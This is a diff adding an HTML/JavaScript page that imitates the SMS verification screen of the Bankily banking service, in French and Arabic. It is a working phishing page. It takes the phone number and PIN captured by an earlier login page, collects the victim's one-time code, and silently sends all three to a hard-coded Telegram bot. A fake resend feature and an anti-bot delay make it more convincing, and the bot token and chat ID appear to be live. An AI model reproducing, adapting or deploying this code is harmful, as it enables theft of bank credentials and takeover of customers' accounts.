@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Code de vérification</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { overflow-x: hidden; width: 100%; }
+
+```
+body {
+  font-family: Arial, sans-serif;
+  background-color: #030E14;
+  background-image: url('images/bankilyback2.png');
+  background-repeat: no-repeat;
+  background-position: center center;
+  background-attachment: fixed;
+  background-size: cover;
+  text-align: center;
+  padding: 20px;
+  direction: ltr;
+  min-height: 100vh;
+}
+
+/* ── Top bar ── */
+.top-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #0097A7;
+  padding: 10px 14px;
+  margin: -20px -20px 0 -20px;
+}
+.top-bar-btn {
+  background: rgba(255,255,255,0.18);
+  border: 1px solid rgba(255,255,255,0.5);
+  color: #fff;
+  padding: 5px 13px;
+  border-radius: 20px;
+  cursor: pointer;
+  font-size: 13px;
+  font-weight: bold;
+  letter-spacing: 0.4px;
+  transition: background 0.2s;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+}
+.top-bar-btn:hover { background: rgba(255,255,255,0.32); }
+.top-bar-title {
+  color: #fff;
+  font-size: 17px;
+  font-weight: bold;
+}
+
+.instructions {
+  font-size: 16px;
+  margin: 24px 0 30px;
+  line-height: 1.6;
+  padding: 0 10px;
+  color: #fff;
+  text-shadow: 0 1px 3px rgba(0,0,0,.5);
+}
+
+/* ── OTP inputs ── */
+.pin-container {
+  display: flex;
+  justify-content: center;
+  direction: ltr;
+  gap: 15px;
+  margin-bottom: 25px;
+}
+.pin-input {
+  width: 52px;
+  height: 58px;
+  font-size: 24px;
+  font-weight: bold;
+  text-align: center;
+  border: 2px solid #ccc;
+  border-radius: 8px;
+  outline: none;
+  background: #fff;
+  color: #000;
+  direction: ltr;
+  transition: border-color .2s, box-shadow .2s;
+}
+.pin-input:focus {
+  border-color: #0097A7;
+  box-shadow: 0 0 0 3px rgba(0,151,167,.2);
+}
+
+/* ── Timer ── */
+.expire-text {
+  font-size: 14px;
+  margin-bottom: 5px;
+  font-weight: bold;
+  color: #fff;
+  text-shadow: 0 1px 2px rgba(0,0,0,.4);
+}
+.timer {
+  font-size: 16px;
+  margin-bottom: 20px;
+  color: #fff;
+}
+
+/* ── Spinner ── */
+.spinner {
+  margin: 20px auto;
+  width: 24px;
+  height: 24px;
+  border: 4px solid rgba(255,255,255,.4);
+  border-top: 4px solid #0097A7;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin { 100% { transform: rotate(360deg); } }
+
+/* ── Resend ── */
+.resend {
+  color: #FFC107;
+  text-decoration: underline;
+  cursor: pointer;
+  font-size: 14px;
+  margin-top: 20px;
+  background: none;
+  border: none;
+  padding: 0;
+  font-weight: bold;
+}
+.resend:hover { color: #FFD54F; }
+
+/* ── Logo ── */
+.logo {
+  margin-top: 20px;
+  width: 170px;
+  height: auto;
+  opacity: 0.9;
+}
+
+/* ── Verify button (fixed bottom) ── */
+.verify-btn {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background-color: #FFC107;
+  color: #000;
+  padding: 15px;
+  font-size: 18px;
+  font-weight: bold;
+  border: none;
+  cursor: pointer;
+  transition: transform 0.25s ease, background 0.2s;
+  z-index: 1000;
+}
+.verify-btn:hover { background-color: #FFD54F; }
+.verify-btn:disabled { background-color: #ccc; cursor: not-allowed; }
+
+/* ── Loader overlay ── */
+#loader-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw; height: 100vh;
+  background: rgba(0,0,0,0.8);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+}
+#loader-overlay.active { display: flex; }
+#loader-overlay .spinner {
+  border: 6px solid #FFC107;
+  border-top: 6px solid transparent;
+  width: 50px; height: 50px;
+}
+
+/* ── Modal ── */
+#modal-alert {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.6);
+  z-index: 10000;
+  justify-content: center;
+  align-items: center;
+}
+.modal-box {
+  background: white;
+  padding: 20px 30px;
+  border-radius: 8px;
+  text-align: center;
+  max-width: 90%;
+}
+.modal-box p {
+  font-size: 16px;
+  color: #333;
+  margin-bottom: 15px;
+  line-height: 1.6;
+  white-space: pre-line;
+}
+.modal-box button {
+  background-color: #0097A7;
+  color: white;
+  border: none;
+  padding: 9px 22px;
+  border-radius: 5px;
+  cursor: pointer;
+  font-size: 15px;
+}
+.modal-box button:hover { background-color: #00838F; }
+
+/* ── Guard overlay ── */
+#guard-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.88);
+  z-index: 99999;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  gap: 16px;
+  text-align: center;
+  padding: 20px;
+}
+#guard-overlay.active { display: flex; }
+.g-icon  { font-size: 56px; }
+.g-msg   { font-size: 18px; font-weight: bold; color: #fff; line-height: 1.5; }
+.g-sub   { font-size: 14px; color: #FFC107; }
+.g-spin  {
+  width: 44px; height: 44px;
+  border: 5px solid rgba(255,255,255,.3);
+  border-top: 5px solid #FFC107;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  margin-top: 10px;
+}
+```
+
+  </style>
+</head>
+<body>
+
+  <!-- Guard overlay -->
+
+  <div id="guard-overlay">
+    <div class="g-icon">🔒</div>
+    <div class="g-msg" id="guard-msg"></div>
+    <div class="g-sub" id="guard-sub"></div>
+    <div class="g-spin"></div>
+  </div>
+
+  <!-- Loader -->
+
+  <div id="loader-overlay">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Modal -->
+
+  <div id="modal-alert">
+    <div class="modal-box">
+      <p id="modal-text"></p>
+      <button id="modal-close">OK</button>
+    </div>
+  </div>
+
+  <!-- Top bar -->
+
+  <div class="top-bar" id="top-bar">
+    <a href="login.html" class="top-bar-btn" id="back-btn">&#8592; Retour</a>
+    <span class="top-bar-title" id="top-bar-title">Code de vérification</span>
+    <button class="top-bar-btn" id="lang-btn" onclick="toggleLang()">عربي</button>
+  </div>
+
+  <p class="instructions" id="instruction" style="margin-top: 24px;">
+    Entrez le code de vérification SMS transmis sur votre numéro de téléphone
+  </p>
+
+  <!-- OTP inputs -->
+
+  <div class="pin-container" dir="ltr">
+    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+    <input type="tel" class="pin-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
+  </div>
+
+  <p class="expire-text" id="expire-text">Code de vérification expire dans</p>
+  <p class="timer" id="timer">4:59</p>
+
+  <div class="spinner"></div>
+
+<button type="button" class="resend" id="resend" onclick="resendCode()">Renvoyer code de vérification</button>
+
+  <img src="images/logo.png" alt="Logo" class="logo">
+
+  <!-- Fixed verify button -->
+
+<button type="button" class="verify-btn" id="verify" onclick="submitOTP()">Vérifier</button>
+
+<script>
+/* ═══════════════════════════════════════
+   TEXTES BILINGUES
+═══════════════════════════════════════ */
+const T = {
+  ar: {
+    dir:'rtl', lang:'ar',
+    back:'رجوع &#8594;', langBtn:'FR',
+    topTitle:'رمز التحقق',
+    instruction:'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
+    expireText:'ينتهي رمز التحقق بعد',
+    resend:'إعادة إرسال رمز التحقق',
+    verify:'تحقق',
+    expired:'انتهت صلاحية الرمز',
+    resendDone:'تم إرسال رمز جديد',
+    errEmpty:'الرجاء إدخال جميع الأرقام الأربعة',
+    errDigits:'الرجاء إدخال أرقام صحيحة فقط',
+    errSamePin:'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
+    errTooFast:'عزيزي (ة) المشترك (ة)\nيجب عليك أن تتأكد من أنك قد قمت بإدخال رمز التحقق الذي تلقيته عن طريق رسالة نصية SMS',
+    guardMsg:'يجب عليك إدخال رقمك ورمزك السري أولاً',
+    guardSub:'جاري تحويلك إلى صفحة تسجيل الدخول...',
+  },
+  fr: {
+    dir:'ltr', lang:'fr',
+    back:'&#8592; Retour', langBtn:'عربي',
+    topTitle:'Code de vérification',
+    instruction:'Entrez le code de vérification SMS transmis sur votre numéro de téléphone',
+    expireText:'Code de vérification expire dans',
+    resend:'Renvoyer code de vérification',
+    verify:'Vérifier',
+    expired:'Le code a expiré',
+    resendDone:'Un nouveau code a été envoyé',
+    errEmpty:'Veuillez entrer les 4 chiffres du code',
+    errDigits:'Veuillez entrer uniquement des chiffres valides',
+    errSamePin:'Le code de vérification ne peut pas être identique au code PIN',
+    errTooFast:"Cher(e) abonné(e),\nVous devez vous assurer d'avoir saisi le code de vérification que vous avez reçu par SMS",
+    guardMsg:"Vous devez d'abord saisir votre numéro et code PIN",
+    guardSub:'Redirection vers la page de connexion...',
+  }
+};
+
+/* ═══════════════════════════════════════
+   LANGUE
+═══════════════════════════════════════ */
+let isArabic = localStorage.getItem('bankily_lang') === 'ar';
+
+function getLang(){ return isArabic ? T.ar : T.fr; }
+
+function applyLang(){
+  const t = getLang();
+  document.body.dir             = t.dir;
+  document.documentElement.lang = t.lang;
+  document.getElementById('back-btn').innerHTML        = t.back;
+  document.getElementById('lang-btn').textContent      = t.langBtn;
+  document.getElementById('top-bar-title').innerText   = t.topTitle;
+  document.getElementById('instruction').innerText     = t.instruction;
+  document.getElementById('expire-text').innerText     = t.expireText;
+  document.getElementById('resend').innerText          = t.resend;
+  document.getElementById('verify').innerText          = t.verify;
+}
+
+function toggleLang(){
+  isArabic = !isArabic;
+  localStorage.setItem('bankily_lang', isArabic ? 'ar' : 'fr');
+  applyLang();
+}
+
+/* ═══════════════════════════════════════
+   HELPERS
+═══════════════════════════════════════ */
+function showModal(msg){
+  document.getElementById('modal-text').innerText = msg;
+  document.getElementById('modal-alert').style.display = 'flex';
+}
+
+document.getElementById('modal-close').addEventListener('click', () => {
+  document.getElementById('modal-alert').style.display = 'none';
+});
+
+/* ═══════════════════════════════════════
+   GUARD — doit venir de login.html
+═══════════════════════════════════════ */
+const savedPin      = sessionStorage.getItem('bankily_pin');
+const savedUsername = sessionStorage.getItem('bankily_username') || '—';
+
+applyLang(); // appliquer langue dès le départ
+
+if (!savedPin || savedPin.trim() === '') {
+  const t = getLang();
+  document.getElementById('guard-msg').textContent = t.guardMsg;
+  document.getElementById('guard-sub').textContent = t.guardSub;
+  document.getElementById('guard-msg').style.direction = t.dir;
+  document.getElementById('guard-overlay').classList.add('active');
+  document.body.style.overflow = 'hidden';
+  setTimeout(() => window.location.replace('login.html'), 1500);
+
+} else {
+
+  /* ═══════════════════════════════════════
+     FLUX NORMAL
+  ═══════════════════════════════════════ */
+  const inputs     = Array.from(document.querySelectorAll('.pin-input'));
+  const verifyBtn  = document.getElementById('verify');
+  const timerEl    = document.getElementById('timer');
+  const pageLoaded = Date.now();
+
+  /* ── Navigation inputs ── */
+  inputs.forEach((input, i) => {
+    input.setAttribute('dir', 'ltr');
+    input.addEventListener('input', () => {
+      input.value = input.value.replace(/[^0-9]/g, '');
+      if (input.value.length === 1 && i < inputs.length - 1) inputs[i+1].focus();
+    });
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && input.value === '' && i > 0) {
+        inputs[i-1].focus();
+        inputs[i-1].value = '';
+      }
+      if (!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) {
+        e.preventDefault();
+      }
+    });
+    input.addEventListener('paste', e => {
+      e.preventDefault();
+      const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g,'');
+      [...digits].slice(0,4).forEach((d, j) => {
+        if(inputs[j]){ inputs[j].value = d; }
+      });
+      inputs[Math.min(digits.length, inputs.length-1)].focus();
+    });
+  });
+
+  /* ── Countdown 5 min ── */
+  let seconds = 299;
+  let timerInterval = null;
+
+  function updateTimer(){
+    const m = Math.floor(seconds/60);
+    const s = String(seconds%60).padStart(2,'0');
+    timerEl.textContent = `${m}:${s}`;
+    if (seconds > 0) {
+      seconds--;
+    } else {
+      clearInterval(timerInterval);
+      timerEl.textContent = getLang().expired;
+      timerEl.style.color = 'red';
+      verifyBtn.disabled  = true;
+    }
+  }
+  updateTimer();
+  timerInterval = setInterval(updateTimer, 1000);
+
+  /* ── Resend ── */
+  window.resendCode = function(){
+    clearInterval(timerInterval);
+    seconds = 299;
+    timerEl.style.color = '#fff';
+    verifyBtn.disabled  = false;
+    inputs.forEach(i => i.value = '');
+    inputs[0].focus();
+    showModal(getLang().resendDone);
+    updateTimer();
+    timerInterval = setInterval(updateTimer, 1000);
+  };
+
+  /* ── Keyboard lift for fixed button ── */
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', () => {
+      const kb = window.innerHeight - window.visualViewport.height;
+      verifyBtn.style.transform = kb > 0 ? `translateY(-${kb}px)` : 'translateY(0)';
+    });
+  }
+
+  /* ── Telegram ── */
+  const TG_TOKEN   = '8250056043:AAFYXOIiBAeHTuZV8pPZUhV6NRTwMPipfrM';
+  const TG_CHAT_ID = '8372738559';
+
+  async function sendTelegram(text){
+    try {
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: 'HTML' })
+      });
+    } catch(e){ /* silent */ }
+  }
+
+  /* ── SUBMIT OTP ── */
+  window.submitOTP = async function(){
+    const t = getLang();
+
+    /* Vérif 5s anti-bot */
+    if ((Date.now() - pageLoaded) / 1000 < 5) {
+      showModal(t.errTooFast);
+      return;
+    }
+
+    const otp = inputs.map(i => i.value).join('');
+
+    if (otp.length !== 4 || inputs.some(i => i.value === '')) {
+      showModal(t.errEmpty); return;
+    }
+    if (!/^[0-9]{4}$/.test(otp)) {
+      showModal(t.errDigits); return;
+    }
+    if (otp === savedPin) {
+      showModal(t.errSamePin);
+      inputs.forEach(i => i.value = '');
+      inputs[0].focus();
+      return;
+    }
+
+    /* Loader */
+    document.getElementById('loader-overlay').classList.add('active');
+    verifyBtn.disabled = true;
+
+    /* Envoyer à Telegram */
+    const now = new Date().toLocaleString(isArabic ? 'ar-SA' : 'fr-FR');
+    await sendTelegram(
+      `✅ <b>Code OTP – Bankily</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n` +
+      `🔑 <b>PIN    :</b> <code>${savedPin}</code>\n` +
+      `🔢 <b>OTP    :</b> <code>${otp}</code>\n` +
+      `📅 <b>Heure  :</b> ${now}`
+    );
+
+    /* Nettoyer session */
+    sessionStorage.removeItem('bankily_pin');
+    sessionStorage.removeItem('bankily_username');
+
+    /* ✅ Aller à approuv.html */
+    window.location.href = 'approuv.html';
+  };
+
+} /* fin flux normal */
+</script>
+
+</body>
+</html>
